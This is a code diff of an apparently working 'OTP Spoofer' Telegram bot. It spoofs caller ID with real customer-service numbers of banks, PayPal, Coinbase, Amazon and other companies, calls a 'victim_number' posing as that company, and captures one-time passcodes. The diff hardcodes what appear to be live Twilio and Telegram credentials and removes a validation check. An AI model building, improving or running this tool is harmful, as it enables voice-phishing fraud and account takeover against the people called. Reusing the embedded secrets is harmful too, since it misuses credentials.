@@ -16,22 +16,13 @@ from datetime import datetime
 import requests
 
 app = Flask(__name__)
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')  # Log to screen
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger()
 CONFIG_FILE = "config.json"
 
-# Spoof pool with real company numbers (publicly listed customer service lines)
 SPOOF_POOL = [
-    "+18882804331",  # Amazon Customer Service
-    "+18009359935",  # Chase Bank Customer Service
-    "+18005254800",  # PayPal Customer Service
-    "+18002752273",  # Bank of America Customer Service
-    "+18553266963",  # Coinbase Support
-    "+18004321000",  # Wells Fargo Customer Service
-    "+18883766276",  # Google Support (Google One)
-    "+18004663337",  # Capital One Customer Service
-    "+18884240401",  # eBay Customer Service
-    "+18009525111"   # American Express Customer Service
+    "+18882804331", "+18009359935", "+18005254800", "+18002752273", "+18553266963",
+    "+18004321000", "+18883766276", "+18004663337", "+18884240401", "+18009525111"
 ]
 
 def load_config():
@@ -40,10 +31,10 @@ def load_config():
             config = json.load(file)
     except FileNotFoundError:
         config = {
-            "TWILIO_SID": "",
-            "TWILIO_AUTH_TOKEN": "",
-            "TWILIO_PHONE_NUMBER": "",
-            "TELEGRAM_BOT_TOKEN": "",
+            "TWILIO_SID": "ACf69358490e7f02624710168982b14842",
+            "TWILIO_AUTH_TOKEN": "de2a3e0b29fb6ff4ef2187a7c865e912",
+            "TWILIO_PHONE_NUMBER": "+16817716834",
+            "TELEGRAM_BOT_TOKEN": "7914248387:AAEz7FeQcSeakr3zlvWDvi2N2FdXg_QGpz0",
             "CALLBACK_URL": "",
             "otp_length": 6,
             "language": "en",
@@ -51,17 +42,6 @@ def load_config():
             "retry_attempts": 3,
             "spoof_pool": SPOOF_POOL
         }
-    # Auto-add your creds if missing
-    if not config["TWILIO_SID"]:
-        config["TWILIO_SID"] = "ACf69358490e7f02624710168982b14842"
-    if not config["TWILIO_AUTH_TOKEN"]:
-        config["TWILIO_AUTH_TOKEN"] = "de2a3e0b29fb6ff4ef2187a7c865e912"
-    if not config["TWILIO_PHONE_NUMBER"]:
-        config["TWILIO_PHONE_NUMBER"] = "+16817716834"
-    if not config["TELEGRAM_BOT_TOKEN"]:
-        config["TELEGRAM_BOT_TOKEN"] = "7914248387:AAEz7FeQcSeakr3zlvWDvi2N2FdXg_QGpz0"
-    # Save if we added anything
-    if not os.path.exists(CONFIG_FILE):
         save_config(config)
     return config
 
@@ -91,7 +71,7 @@ def receive_otp():
 
 def generate_ai_voice(prompt):
     audio_file = f"/tmp/voice_{random.randint(1000, 9999)}.wav"
-    subprocess.run(["echo", prompt, ">", audio_file])  # Placeholder—replace with real TTS
+    subprocess.run(["echo", prompt, ">", audio_file])
     return audio_file
 
 def initiate_call(victim_number, company_name, spoof_number, full_name):
@@ -128,15 +108,15 @@ async def send_telegram_otp(victim_number, otp):
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Ultimate OTP Spoofer online.\n"
-                                    "Use /call <victim_number> <company_name> <full_name> for random spoof,\n"
-                                    "or /call <victim_number> <company_name> <spoof_number> <full_name> for specific spoof.")
+                                    "Use /call <victim_number> <company_name> <full_name> (random spoof)\n"
+                                    "or /call <victim_number> <company_name> <spoof_number> <full_name>")
 
 async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if len(args) not in [3, 4]:
         await update.message.reply_text("Usage:\n"
                                         "/call <victim_number> <company_name> <full_name> (random spoof)\n"
-                                        "/call <victim_number> <company_name> <spoof_number> <full_name> (specific spoof)")
+                                        "/call <victim_number> <company_name> <spoof_number> <full_name>")
         return
     
     victim_number = args[0]
@@ -151,9 +131,6 @@ async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if not validate_phone_number(victim_number):
         await update.message.reply_text("Invalid victim number.")
-        return
-    if not validate_phone_number(spoof_number):
-        await update.message.reply_text("Invalid spoof number.")
         return
     
     await async_initiate_call(victim_number, company_name, spoof_number, full_name)
@@ -194,7 +171,7 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     threading.Thread(target=stop_server).start()
 
 async def service_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    script_path = "/home/cris/otmp/otmp.py"
+    script_path = "/home/cris/motp/motp.py"  # Updated for your dir
     service_file = f"""
 [Unit]
 Description=OTP Spoofer Service
@@ -202,7 +179,7 @@ After=network.target
 
 [Service]
 ExecStart=/usr/bin/python3 {script_path}
-WorkingDirectory=/home/cris/otmp
+WorkingDirectory=/home/cris/motp
 Restart=always
 User=cris
 
@@ -218,7 +195,7 @@ WantedBy=multi-user.target
 
 def start_ngrok():
     ngrok_process = subprocess.Popen(["ngrok", "http", "5000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    threading.Event().wait(2)
+    threading.Event().wait(5)  # Increased to 5s for stability
     try:
         response = requests.get("http://localhost:4040/api/tunnels")
         ngrok_url = response.json()["tunnels"][0]["public_url"]
@@ -229,7 +206,7 @@ def start_ngrok():
 
 def guided_setup():
     global config
-    if not config["CALLBACK_URL"]:  # Only set ngrok if not already done
+    if not config["CALLBACK_URL"]:
         print("Setting up—loading creds and starting ngrok...")
         try:
             config["CALLBACK_URL"] = start_ngrok()
